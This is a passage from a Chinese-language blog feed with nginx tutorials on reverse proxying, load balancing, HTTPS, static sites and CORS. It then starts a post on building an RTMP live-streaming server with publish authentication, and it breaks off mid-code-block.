process进程的最大并发链接数</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#设定http服务器，利用它的反向代理功能提供负载均衡支持</span><br><span class="line">http &#123;</span><br><span class="line">   #设定mime类型(邮件支持类型),类型由mime.types文件定义</span><br><span class="line">   include       D:/Tools/nginx-1.10.1/conf/mime.types;</span><br><span class="line">   default_type  application/octet-stream;</span><br><span class="line">   </span><br><span class="line">   #设定日志</span><br><span class="line">   log_format  main  &apos;[$remote_addr] - [$remote_user] [$time_local] &quot;$request&quot; &apos;</span><br><span class="line">                     &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class="line">                     &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class="line">                     </span><br><span class="line">   access_log    D:/Tools/nginx-1.10.1/logs/access.log main;</span><br><span class="line">   rewrite_log     on;</span><br><span class="line">   </span><br><span class="line">   #sendfile 指令指定 nginx 是否调用 sendfile 函数（zero copy 方式）来输出文件，对于普通应用，</span><br><span class="line">   #必须设为 on,如果用来进行下载等应用磁盘IO重负载应用，可设置为 off，以平衡磁盘与网络I/O处理速度，降低系统的uptime.</span><br><span class="line">   sendfile        on;</span><br><span class="line">   #tcp_nopush     on;</span><br><span class="line"></span><br><span class="line">   #连接超时时间</span><br><span class="line">   keepalive_timeout  120;</span><br><span class="line">   tcp_nodelay        on;</span><br><span class="line">   </span><br><span class="line">   #gzip压缩开关</span><br><span class="line">   #gzip  on;</span><br><span class="line"></span><br><span class="line">   #设定实际的服务器列表 </span><br><span class="line">   upstream zp_server1&#123;</span><br><span class="line">       server 127.0.0.1:8089;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   #HTTP服务器</span><br><span class="line">   server &#123;</span><br><span class="line">       #监听80端口，80端口是知名端口号，用于HTTP协议</span><br><span class="line">       listen       80;</span><br><span class="line">       </span><br><span class="line">       #定义使用www.xx.com访问</span><br><span class="line">       server_name  www.helloworld.com;</span><br><span class="line">       </span><br><span class="line">       #首页</span><br><span class="line">       index index.html</span><br><span class="line">       </span><br><span class="line">       #指向webapp的目录</span><br><span class="line">       root D:_WorkspaceProjectgithubzpSpringNotesspring-securityspring-shirosrcmainwebapp;</span><br><span class="line">       </span><br><span class="line">       #编码格式</span><br><span class="line">       charset utf-8;</span><br><span class="line">       </span><br><span class="line">       #代理配置参数</span><br><span class="line">       proxy_connect_timeout 180;</span><br><span class="line">       proxy_send_timeout 180;</span><br><span class="line">       proxy_read_timeout 180;</span><br><span class="line">       proxy_set_header Host $host;</span><br><span class="line">       proxy_set_header X-Forwarder-For $remote_addr;</span><br><span class="line"></span><br><span class="line">       #反向代理的路径（和upstream绑定），location 后面设置映射的路径</span><br><span class="line">       location / &#123;</span><br><span class="line">           proxy_pass http://zp_server1;</span><br><span class="line">       &#125; </span><br><span class="line"></span><br><span class="line">       #静态文件，nginx自己处理</span><br><span class="line">       location ~ ^/(images|javascript|js|css|flash|media|static)/ &#123;</span><br><span class="line">           root D:_WorkspaceProjectgithubzpSpringNotesspring-securityspring-shirosrcmainwebappiews;</span><br><span class="line">           #过期30天，静态文件不怎么更新，过期可以设大一点，如果频繁更新，则可以设置得小一点。</span><br><span class="line">           expires 30d;</span><br><span class="line">       &#125;</span><br><span class="line">   </span><br><span class="line">       #设定查看Nginx状态的地址</span><br><span class="line">       location /NginxStatus &#123;</span><br><span class="line">           stub_status           on;</span><br><span class="line">           access_log            on;</span><br><span class="line">           auth_basic            &quot;NginxStatus&quot;;</span><br><span class="line">           auth_basic_user_file  conf/htpasswd;</span><br><span class="line">       &#125;</span><br><span class="line">   </span><br><span class="line">       #禁止访问 .htxxx 文件</span><br><span class="line">       location ~ /.ht &#123;</span><br><span class="line">           deny all;</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">       #错误处理页面（可选择性配置）</span><br><span class="line">       #error_page   404              /404.html;</span><br><span class="line">       #error_page   500 502 503 504  /50x.html;</span><br><span class="line">       #location = /50x.html &#123;</span><br><span class="line">       #    root   html;</span><br><span class="line">       #&#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好了，让我们来试试吧：</p><ol><li>启动 webapp，注意启动绑定的端口要和nginx中的 upstream 设置的端口保持一致。</li><li>更改 host：在 C:WindowsSystem32driversetc 目录下的host文件中添加一条DNS 记录127.0.0.1 <a href="https://link.zhihu.com/?target=http%3A//www.helloworld.com" target="_blank" rel="noopener">http://www.helloworld.com</a></li><li>启动前文中 startup.bat 的命令</li><li>在浏览器中访问 <a href="https://link.zhihu.com/?target=http%3A//www.helloworld.com" target="_blank" rel="noopener">http://www.helloworld.com</a>，不出意外，已经可以访问了。</li></ol><h3 id="负载均衡配置"><a href="#负载均衡配置" class="headerlink" title="负载均衡配置"></a><strong>负载均衡配置</strong></h3><p>上一个例子中，代理仅仅指向一个服务器。</p><p>但是，网站在实际运营过程中，多半都是有多台服务器运行着同样的app，这时需要使用负载均衡来分流。</p><p>nginx也可以实现简单的负载均衡功能。</p><p>假设这样一个应用场景：将应用部署在 192.168.1.11:80、192.168.1.12:80、192.168.1.13:80 三台linux环境的服务器上。网站域名叫 <a href="https://link.zhihu.com/?target=http%3A//www.helloworld.com" target="_blank" rel="noopener">http://www.helloworld.com</a>，公网IP为 192.168.1.11。在公网IP所在的服务器上部署 nginx，对所有请求做负载均衡处理。</p><p>nginx.conf 配置如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">    #设定mime类型,类型由mime.type文件定义</span><br><span class="line">   include       /etc/nginx/mime.types;</span><br><span class="line">   default_type  application/octet-stream;</span><br><span class="line">   #设定日志格式</span><br><span class="line">   access_log    /var/log/nginx/access.log;</span><br><span class="line"></span><br><span class="line">   #设定负载均衡的服务器列表</span><br><span class="line">   upstream load_balance_server &#123;</span><br><span class="line">       #weigth参数表示权值，权值越高被分配到的几率越大</span><br><span class="line">       server 192.168.1.11:80   weight=5;</span><br><span class="line">       server 192.168.1.12:80   weight=1;</span><br><span class="line">       server 192.168.1.13:80   weight=6;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  #HTTP服务器</span><br><span class="line">  server &#123;</span><br><span class="line">       #侦听80端口</span><br><span class="line">       listen       80;</span><br><span class="line">       </span><br><span class="line">       #定义使用www.xx.com访问</span><br><span class="line">       server_name  www.helloworld.com;</span><br><span class="line"></span><br><span class="line">       #对所有请求进行负载均衡请求</span><br><span class="line">       location / &#123;</span><br><span class="line">           root        /root;                 #定义服务器的默认网站根目录位置</span><br><span class="line">           index       index.html index.htm;  #定义首页索引文件的名称</span><br><span class="line">           proxy_pass  http://load_balance_server ;#请求转向load_balance_server 定义的服务器列表</span><br><span class="line"></span><br><span class="line">           #以下是一些反向代理的配置(可选择性配置)</span><br><span class="line">           #proxy_redirect off;</span><br><span class="line">           proxy_set_header Host $host;</span><br><span class="line">           proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">           #后端的Web服务器可以通过X-Forwarded-For获取用户真实IP</span><br><span class="line">           proxy_set_header X-Forwarded-For $remote_addr;</span><br><span class="line">           proxy_connect_timeout 90;          #nginx跟后端服务器连接超时时间(代理连接超时)</span><br><span class="line">           proxy_send_timeout 90;             #后端服务器数据回传时间(代理发送超时)</span><br><span class="line">           proxy_read_timeout 90;             #连接成功后，后端服务器响应时间(代理接收超时)</span><br><span class="line">           proxy_buffer_size 4k;              #设置代理服务器（nginx）保存用户头信息的缓冲区大小</span><br><span class="line">           proxy_buffers 4 32k;               #proxy_buffers缓冲区，网页平均在32k以下的话，这样设置</span><br><span class="line">           proxy_busy_buffers_size 64k;       #高负荷下缓冲大小（proxy_buffers*2）</span><br><span class="line">           proxy_temp_file_write_size 64k;    #设定缓存文件夹大小，大于这个值，将从upstream服务器传</span><br><span class="line">           </span><br><span class="line">           client_max_body_size 10m;          #允许客户端请求的最大单文件字节数</span><br><span class="line">           client_body_buffer_size 128k;      #缓冲区代理缓冲用户端请求的最大字节数</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="网站有多个webapp的配置"><a href="#网站有多个webapp的配置" class="headerlink" title="网站有多个webapp的配置"></a><strong>网站有多个webapp的配置</strong></h3><p>当一个网站功能越来越丰富时，往往需要将一些功能相对独立的模块剥离出来，独立维护。这样的话，通常，会有多个 webapp。</p><p>举个例子：假如 <a href="https://link.zhihu.com/?target=http%3A//www.helloworld.com" target="_blank" rel="noopener">http://www.helloworld.com</a> 站点有好几个webapp，finance（金融）、product（产品）、admin（用户中心）。访问这些应用的方式通过上下文(context)来进行区分:</p><ul><li><a href="https://link.zhihu.com/?target=http%3A//www.helloworld.com/finance/" target="_blank" rel="noopener">http://www.helloworld.com/finance/</a></li><li><a href="https://link.zhihu.com/?target=http%3A//www.helloworld.com/product/" target="_blank" rel="noopener">http://www.helloworld.com/product/</a></li><li><a href="https://link.zhihu.com/?target=http%3A//www.helloworld.com/admin/" target="_blank" rel="noopener">http://www.helloworld.com/admin/</a></li></ul><p>我们知道，http的默认端口号是80，如果在一台服务器上同时启动这3个 webapp 应用，都用80端口，肯定是不成的。所以，这三个应用需要分别绑定不同的端口号。</p><p>那么，问题来了，用户在实际访问 <a href="https://link.zhihu.com/?target=http%3A//www.helloworld.com" target="_blank" rel="noopener">http://www.helloworld.com</a> 站点时，访问不同 webapp，总不会还带着对应的端口号去访问吧。所以，你再次需要用到反向代理来做处理。</p><p>配置也不难，来看看怎么做吧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">   #此处省略一些基本配置</span><br><span class="line">   </span><br><span class="line">   upstream product_server&#123;</span><br><span class="line">       server www.helloworld.com:8081;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   upstream admin_server&#123;</span><br><span class="line">       server www.helloworld.com:8082;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   upstream finance_server&#123;</span><br><span class="line">       server www.helloworld.com:8083;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   server &#123;</span><br><span class="line">       #此处省略一些基本配置</span><br><span class="line">       #默认指向product的server</span><br><span class="line">       location / &#123;</span><br><span class="line">           proxy_pass http://product_server;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       location /product/&#123;</span><br><span class="line">           proxy_pass http://product_server;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       location /admin/ &#123;</span><br><span class="line">           proxy_pass http://admin_server;</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">       location /finance/ &#123;</span><br><span class="line">           proxy_pass http://finance_server;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="https反向代理配置"><a href="#https反向代理配置" class="headerlink" title="https反向代理配置"></a><strong>https反向代理配置</strong></h3><p>一些对安全性要求比较高的站点，可能会使用 HTTPS（一种使用ssl通信标准的安全HTTP协议）。</p><p>这里不科普 HTTP 协议和 SSL 标准。但是，使用 nginx 配置 https 需要知道几点：</p><ul><li>HTTPS 的固定端口号是 443，不同于 HTTP 的 80 端口</li><li>SSL 标准需要引入安全证书，所以在 nginx.conf 中你需要指定证书和它对应的 key</li></ul><p>其他和 http 反向代理基本一样，只是在 Server 部分配置有些不同。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#HTTP服务器</span><br><span class="line"> server &#123;</span><br><span class="line">     #监听443端口。443为知名端口号，主要用于HTTPS协议</span><br><span class="line">     listen       443 ssl;</span><br><span class="line"></span><br><span class="line">     #定义使用www.xx.com访问</span><br><span class="line">     server_name  www.helloworld.com;</span><br><span class="line"></span><br><span class="line">     #ssl证书文件位置(常见证书文件格式为：crt/pem)</span><br><span class="line">     ssl_certificate      cert.pem;</span><br><span class="line">     #ssl证书key位置</span><br><span class="line">     ssl_certificate_key  cert.key;</span><br><span class="line"></span><br><span class="line">     #ssl配置参数（选择性配置）</span><br><span class="line">     ssl_session_cache    shared:SSL:1m;</span><br><span class="line">     ssl_session_timeout  5m;</span><br><span class="line">     #数字签名，此处使用MD5</span><br><span class="line">     ssl_ciphers  HIGH:!aNULL:!MD5;</span><br><span class="line">     ssl_prefer_server_ciphers  on;</span><br><span class="line"></span><br><span class="line">     location / &#123;</span><br><span class="line">         root   /root;</span><br><span class="line">         index  index.html index.htm;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="静态站点配置"><a href="#静态站点配置" class="headerlink" title="静态站点配置"></a><strong>静态站点配置</strong></h3><p>有时候，我们需要配置静态站点(即 html 文件和一堆静态资源)。</p><p>举例来说：如果所有的静态资源都放在了 /app/dist 目录下，我们只需要在 nginx.conf 中指定首页以及这个站点的 host 即可。</p><p>配置如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">   worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">   include       mime.types;</span><br><span class="line">   default_type  application/octet-stream;</span><br><span class="line">   sendfile        on;</span><br><span class="line">   keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">   gzip on;</span><br><span class="line">   gzip_types text/plain application/x-javascript text/css application/xml text/javascript application/javascript image/jpeg image/gif image/png;</span><br><span class="line">   gzip_vary on;</span><br><span class="line"></span><br><span class="line">   server &#123;</span><br><span class="line">       listen       80;</span><br><span class="line">       server_name  static.zp.cn;</span><br><span class="line"></span><br><span class="line">       location / &#123;</span><br><span class="line">           root /app/dist;</span><br><span class="line">           index index.html;</span><br><span class="line">           #转发任何请求到 index.html</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后，添加 HOST：127.0.0.1 <a href="https://link.zhihu.com/?target=http%3A//static.zp.cn" target="_blank" rel="noopener">http://static.zp.cn</a>，此时，在本地浏览器访问 <a href="https://link.zhihu.com/?target=http%3A//static.zp.cn" target="_blank" rel="noopener">http://static.zp.cn</a> ，就可以访问静态站点了。</p><h3 id="跨域解决方案"><a href="#跨域解决方案" class="headerlink" title="跨域解决方案"></a><strong>跨域解决方案</strong></h3><p>web 领域开发中，经常采用前后端分离模式。这种模式下，前端和后端分别是独立的 web 应用程序，例如：后端是 Java 程序，前端是 React 或 Vue 应用。</p><p>各自独立的 web app 在互相访问时，势必存在跨域问题。解决跨域问题一般有两种思路：</p><h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a><strong>CORS</strong></h3><p>在后端服务器设置 HTTP 响应头，把你需要运行访问的域名加入加入 Access-Control-Allow-Origin 中。</p><h3 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a><strong>jsonp</strong></h3><p>把后端根据请求，构造json数据，并返回，前端用 jsonp 跨域。</p><p>这两种思路，本文不展开讨论。</p><p>需要说明的是，nginx 根据第一种思路，也提供了一种解决跨域的解决方案。</p><p>举例：<a href="https://link.zhihu.com/?target=http%3A//www.helloworld.com" target="_blank" rel="noopener">http://www.helloworld.com</a> 网站是由一个前端 app ，一个后端 app 组成的。前端端口号为 9000， 后端端口号为 8080。</p><p>前端和后端如果使用 http 进行交互时，请求会被拒绝，因为存在跨域问题。来看看，nginx 是怎么解决的吧：</p><p>首先，在 enable-cors.conf 文件中设置 cors ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># allow origin list</span><br><span class="line">set $ACAO &apos;*&apos;;</span><br><span class="line"></span><br><span class="line"># set single origin</span><br><span class="line">if ($http_origin ~* (www.helloworld.com)$) &#123;</span><br><span class="line"> set $ACAO $http_origin;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($cors = &quot;trueget&quot;) &#123;</span><br><span class="line">   add_header &apos;Access-Control-Allow-Origin&apos; &quot;$http_origin&quot;;</span><br><span class="line">   add_header &apos;Access-Control-Allow-Credentials&apos; &apos;true&apos;;</span><br><span class="line">   add_header &apos;Access-Control-Allow-Methods&apos; &apos;GET, POST, OPTIONS&apos;;</span><br><span class="line">   add_header &apos;Access-Control-Allow-Headers&apos; &apos;DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($request_method = &apos;OPTIONS&apos;) &#123;</span><br><span class="line"> set $cors &quot;$&#123;cors&#125;options&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($request_method = &apos;GET&apos;) &#123;</span><br><span class="line"> set $cors &quot;$&#123;cors&#125;get&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($request_method = &apos;POST&apos;) &#123;</span><br><span class="line"> set $cors &quot;$&#123;cors&#125;post&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来，在你的服务器中 include enable-cors.conf 来引入跨域配置：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ----------------------------------------------------</span></span><br><span class="line"><span class="comment"># 此文件为项目 nginx 配置片段</span></span><br><span class="line"><span class="comment"># 可以直接在 nginx config 中 include（推荐）</span></span><br><span class="line"><span class="comment"># 或者 copy 到现有 nginx 中，自行配置</span></span><br><span class="line"><span class="comment"># www.helloworld.com 域名需配合 dns hosts 进行配置</span></span><br><span class="line"><span class="comment"># 其中，api 开启了 cors，需配合本目录下另一份配置文件</span></span><br><span class="line"><span class="comment"># ----------------------------------------------------</span></span><br><span class="line"><span class="attribute">upstream</span> front_server&#123;</span><br><span class="line"> <span class="attribute">server</span> www.helloworld.com:<span class="number">9000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">upstream</span> api_server&#123;</span><br><span class="line"> <span class="attribute">server</span> www.helloworld.com:<span class="number">8080</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line"> <span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line"> <span class="attribute">server_name</span>  www.helloworld.com;</span><br><span class="line"></span><br><span class="line"> <span class="attribute">location</span> <span class="regexp">~ ^/api/</span> &#123;</span><br><span class="line">   <span class="attribute">include</span> enable-cors.conf;</span><br><span class="line">   <span class="attribute">proxy_pass</span> http://api_server;</span><br><span class="line">   <span class="attribute">rewrite</span> <span class="string">"^/api/(.*)$"</span> /<span class="variable">$1</span> <span class="literal">break</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="attribute">location</span> <span class="regexp">~ ^/</span> &#123;</span><br><span class="line">   <span class="attribute">proxy_pass</span> http://front_server;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> nginx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nginx+rtmp</title>
      <link href="/2019/05/17/nginx-rtmp/"/>
      <url>/2019/05/17/nginx-rtmp/</url>
      
        <content type="html"><![CDATA[<h1 id="nginx-rtmp-搭建视频直播服务器"><a href="#nginx-rtmp-搭建视频直播服务器" class="headerlink" title="nginx+rtmp 搭建视频直播服务器"></a>nginx+rtmp 搭建视频直播服务器</h1><h2 id="服务器安装配置"><a href="#服务器安装配置" class="headerlink" title="服务器安装配置"></a>服务器安装配置</h2><blockquote><p><strong>windows安装包(已编译好的版本)参考：</strong></p><p><a href="http://nginx-win.ecsds.eu/" target="_blank" rel="noopener">nginx for windows</a></p><p><a href="http://blog.chinaunix.net/uid-26000296-id-5748243.html" target="_blank" rel="noopener">windows下搭建基于nginx的rtmp服务器</a></p><p><a href="https://my.oschina.net/gaga/blog/478480" target="_blank" rel="noopener">在Windows下搭建基于nginx的视频直播和点播系统</a></p></blockquote><blockquote><p><strong>搬运源码（未编译）</strong></p><p><a href="https://github.com/Car-eye-team/Car-eye-RTMP-server" target="_blank" rel="noopener">Car-eye-RTMP-server(github)</a></p><p><a href="https://github.com/Car-eye-team/car-eye-http-flv-module" target="_blank" rel="noopener">car-eye-http-flv-module</a></p></blockquote><blockquote><p><strong>nginx+rtmp在windows下编译</strong></p><p><a href="https://www.cnblogs.com/KendoCross/p/7585654.html" target="_blank" rel="noopener">Windows下编译nginx-rtmp-module</a></p><p><a href="https://blog.csdn.net/kenny25/article/details/39399689" target="_blank" rel="noopener">windows下编译nginx+nginx_rtmp_modue(vs2013)</a></p></blockquote><blockquote><p><strong>CentOS搭建nginx+rtmp服务器</strong></p><p><a href="https://www.jianshu.com/p/0a4a34d9eb8f" target="_blank" rel="noopener">nginx+rtmp直播流服务搭建 centos7</a></p><p><a href="https://blog.csdn.net/sz76211822/article/details/79225716" target="_blank" rel="noopener">centos7 Nginx+rtmp 搭建流媒体服务器</a></p></blockquote><p>linux下建议将nginx.conf中的http端口改为1024以上，好像是80端口每次运行都需要su权限。</p><p><a href="https://blog.csdn.net/shuanger_/article/details/48629163" target="_blank" rel="noopener">Nginx搭建rtmp流媒体服务器</a></p><h2 id="nginx服务器常用命令"><a href="#nginx服务器常用命令" class="headerlink" title="nginx服务器常用命令"></a>nginx服务器常用命令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">./nginx -v//查看nginx版本号</span><br><span class="line">./nginx -V //查看nginx详细的版本信息</span><br><span class="line">start ./nginx -c conf/nginx.conf //以nginx.conf的配置启动nginx</span><br><span class="line">./nginx -s stop//停止nginx服务器</span><br><span class="line">./nginx -s quit//停止nginx服务器</span><br><span class="line">./nginx -s reload//重启nginx服务器</span><br><span class="line">service nginx reload//重启nginx服务器</span><br><span class="line">./nginx -t (-c conf/nginx.conf)//检查配置文件是否正确</span><br><span class="line">./nginx -h//显示帮助信息</span><br><span class="line">./nginx -?//显示帮助信息</span><br></pre></td></tr></table></figure><h2 id="nginx-rtmp加入权限控制"><a href="#nginx-rtmp加入权限控制" class="headerlink" title="nginx+rtmp加入权限控制"></a>nginx+rtmp加入权限控制</h2><blockquote><p>本文参考：</p><p>*<a href="https://github.com/arut/nginx-rtmp-module/wiki/Directives" target="_blank" rel="noopener">rtmp-module官方wiki</a></p><p>*<a href="http://www.cnblogs.com/zx-admin/p/5783523.html" target="_blank" rel="noopener">视频直播点播nginx-rtmp开发手册中文版(参考wiki版本粗译)</a></p><p><a href="https://blog.csdn.net/cui918/article/details/53540397#commentBox" target="_blank" rel="noopener">如何给 nginx rtmp 服务加入鉴权机制(改源码)</a></p><p>*<a href="https://blog.csdn.net/weixin_34368949/article/details/85991563" target="_blank" rel="noopener">「自己开发直播」实现nginx-rtmp-module多频道输入输出与权限控制</a></p><p><a href="https://blog.csdn.net/weixin_42579642/article/details/85263210" target="_blank" rel="noopener">nginx-rtmp-module授权机制实现直播推流多房间授权认证</a></p><p><a href="https://blog.csdn.net/iam_shuaidaile/article/details/50599943" target="_blank" rel="noopener">nginx-rtmp-module 权限控制</a></p><p><a href="https://blog.csdn.net/luoc83/article/details/79240774" target="_blank" rel="noopener">nginx-rtmp加入权限验证的简单方法</a></p><p><a href="https://blog.csdn.net/kevinw9/article/details/52984826" target="_blank" rel="noopener">视频直播点播nginx-rtmp开发手册中文版</a></p><p>*<a href="https://www.cnblogs.com/lidabo/p/7099501.html" target="_blank" rel="noopener">nginx.conf中关于nginx-rtmp-module配置指令详解</a></p><p>*<a href="https://blog.csdn.net/wei389083222/article/details/78721074/" target="_blank" rel="noopener">nginx-rtmp多房间和授权实现</a></p><blockquote><p>*博客比较有用</p></blockquote></blockquote><p>nginx的rtmp-module默认不限制推流权限、播放权限。</p><p>想加入权限验证有很多种方法。</p><p>其中一个是改源码，一个是利用nginx+rtmp的配置文件调用后台接口进行验证。</p><p>第一种方法没成功过，第二种方法比较简单。此文介绍第二种方法，第一种方法可见博客-&gt;<a href="https://blog.csdn.net/cui918/article/details/53540397#commentBox" target="_blank" rel="noopener">如何给 nginx rtmp 服务加入鉴权机制(改源码)</a></p><p>原理主要是利用on_publish跳转到当前配置的一个“location”，在这里进行验证。关键点在于rtmp application节点下面要配置“notify_method get;”为什么呢？因为跳转的时候，默认以POST方式传输参数，修改成GET方式，nginx配置里就可以轻松处理了。（当然nginx通过配置文件也可以处理post，只是复杂一些）。</p><p>我们在此使用python的后台框架flask处理on_publish的post请求。</p><p>后台返回http200即为通过验证，返回http500即为验证失败，服务器拒绝连接。</p><p>nginx的配置文件（位于nginx安装目录下：…/nginx/conf/nginx.conf）修改如下:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 